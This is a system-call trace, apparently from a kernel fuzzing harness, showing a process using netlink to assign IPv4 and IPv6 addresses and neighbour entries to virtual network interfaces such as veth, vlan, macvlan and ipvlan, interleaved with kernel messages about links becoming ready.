[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x34\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x2e\x08\x00\x01\x00\xac\x14\x14\x2e"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="virt_wifi0", ifr_ifindex=52}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x34\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2e\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2e"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="virt_wifi0", ifr_ifindex=52}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x34\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x2e\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=64, nlmsg_type=NLMSG_ERROR, nlmsg_flags=0, nlmsg_seq=0, nlmsg_pid=1}, {error=-EOPNOTSUPP, msg=[{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x34\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x2e\x00\x00"]}], 4096, 0, NULL, NULL) = 64
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_vlan", ifr_ifindex=54}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x36\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x2f\x08\x00\x01\x00\xac\x14\x14\x2f"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_vlan", ifr_ifindex=54}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x36\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2f\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2f"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_vlan", ifr_ifindex=54}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x36\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x2f\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_vlan", ifr_ifindex=53}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x35\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x30\x08\x00\x01\x00\xac\x14\x14\x30"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[   77.475527][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth1_virt_wifi: link becomes ready
[   77.485056][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth0_virt_wifi: link becomes ready
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_vlan", ifr_ifindex=53}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x35\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x30\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x30"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_vlan", ifr_ifindex=53}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x35\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x30\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="vlan0", ifr_ifindex=55}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x37\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x31\x08\x00\x01\x00\xac\x14\x14\x31"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="vlan0", ifr_ifindex=55}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x37\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x31\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x31"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="vlan0", ifr_ifindex=55}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x37\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x31\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="vlan1", ifr_ifindex=56}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x38\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x32\x08\x00\x01\x00\xac\x14\x14\x32"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="vlan1", ifr_ifindex=56}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x38\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x32\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x32"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="vlan1", ifr_ifindex=56}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x38\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x32\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="macvlan0", ifr_ifindex=57}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x39\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x33\x08\x00\x01\x00\xac\x14\x14\x33"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="macvlan0", ifr_ifindex=57}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x39\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x33\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x33"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="macvlan0", ifr_ifindex=57}) = 0
[   77.545858][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth1_vlan: link becomes ready
[   77.554932][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth0_vlan: link becomes ready
[   77.565132][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): vlan0: link becomes ready
[   77.573585][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): vlan1: link becomes ready
[   77.589882][ T5086] veth0_vlan: entered promiscuous mode
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x39\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x33\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="macvlan1", ifr_ifindex=58}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x3a\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x34\x08\x00\x01\x00\xac\x14\x14\x34"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="macvlan1", ifr_ifindex=58}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x3a\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x34\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x34"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="macvlan1", ifr_ifindex=58}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x3a\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x34\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="ipvlan0", ifr_ifindex=59}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x3b\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x35\x08\x00\x01\x00\xac\x14\x14\x35"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="ipvlan0", ifr_ifindex=59}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x3b\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x35\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x35"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="ipvlan0", ifr_ifindex=59}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x3b\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x35\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=64, nlmsg_type=NLMSG_ERROR, nlmsg_flags=0, nlmsg_seq=0, nlmsg_pid=1}, {error=-EOPNOTSUPP, msg=[{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x3b\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x35\x00\x00"]}], 4096, 0, NULL, NULL) = 64
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="ipvlan1", ifr_ifindex=60}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x3c\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x36\x08\x00\x01\x00\xac\x14\x14\x36"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
